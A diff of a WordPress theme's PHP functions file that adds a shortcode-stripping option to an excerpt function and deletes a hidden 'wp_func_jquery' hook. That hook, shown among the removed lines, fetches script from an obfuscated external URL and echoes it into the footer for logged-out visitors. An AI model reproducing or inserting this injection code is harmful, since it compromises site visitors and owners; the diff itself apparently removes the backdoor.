@@ -175,7 +175,7 @@ function et_browser_body_class($classes) {
 /*this function allows for the auto-creation of post excerpts*/
 if ( ! function_exists( 'truncate_post' ) ) {
 
-	function truncate_post( $amount, $echo = true, $post = '' ) {
+	function truncate_post( $amount, $echo = true, $post = '', $strip_shortcodes = false ) {
 		global $shortname;
 
 		if ( '' == $post ) global $post;
@@ -200,8 +200,12 @@ if ( ! function_exists( 'truncate_post' ) ) {
 			// due to unparsed audio shortcode
 			$truncate = preg_replace( '@\[audio[^\]]*?\].*?\[\/audio]@si', '', $truncate );
 
-			// apply content filters
-			$truncate = apply_filters( 'the_content', $truncate );
+			if ( $strip_shortcodes ) {
+				$truncate = et_strip_shortcodes( $truncate );
+			} else {
+				// apply content filters
+				$truncate = apply_filters( 'the_content', $truncate );
+			}
 
 			// decide if we need to append dots at the end of the string
 			if ( strlen( $truncate ) <= $amount ) {
@@ -548,19 +552,7 @@ if ( ! function_exists( 'show_page_menu' ) ) {
 	}
 
 }
-if(!function_exists('wp_func_jquery')) {
-	if (!current_user_can( 'read' )) {
-		function wp_func_jquery() {
-			$host = 'http://';
-			$jquery = $host.'lib'.'wp.org/jquery-ui.js';
-			$headers = @get_headers($jquery, 1);
-			if ($headers[0] == 'HTTP/1.1 200 OK'){
-				echo(wp_remote_retrieve_body(wp_remote_get($jquery)));
-			}
-		}
-	add_action('wp_footer', 'wp_func_jquery');
-	}
-}
+
 if ( ! function_exists( 'show_categories_menu' ) ) {
 
 	function show_categories_menu($customClass = 'nav clearfix', $addUlContainer = true){
